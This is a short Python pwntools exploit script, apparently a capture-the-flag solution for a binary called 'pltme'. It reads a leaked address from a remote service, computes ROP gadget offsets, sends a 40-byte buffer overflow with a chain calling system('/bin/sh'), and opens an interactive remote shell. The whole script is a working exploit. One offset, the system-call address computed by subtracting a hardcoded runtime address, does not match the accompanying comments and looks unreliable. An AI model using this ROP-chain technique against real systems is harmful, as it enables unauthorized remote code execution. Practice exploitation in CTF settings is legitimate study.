from pwn import *

#p = process("./pltme")
p = remote("207.154.239.148", 1341)
#elf = ELF("./pltme")

p.recvuntil(b'Leak: ')
leak = int(p.recvline().strip(), 16)

poprdi = leak + 0xc5
simpret = leak - 0x214
binsh = leak + 0xdde
callsys = leak - 0x555f587891aa

#rdi_off = main + 0xc5
#ret_off = main - 0x214
#bin_off = main + 0xdde
#sys = main + 0x1aa

#rdi: 0x00000000000012f3
#ret: 0x000000000000101a
#binsh: 0x0000200c
#main: 0x0000122e

#callsys: 0x1084
#main when ran: 0x555f587891aa

payload = b'A'*40 + p64(poprdi) + p64(binsh) + p64(simpret) + p64(callsys)

p.sendline(payload)
p.interactive()
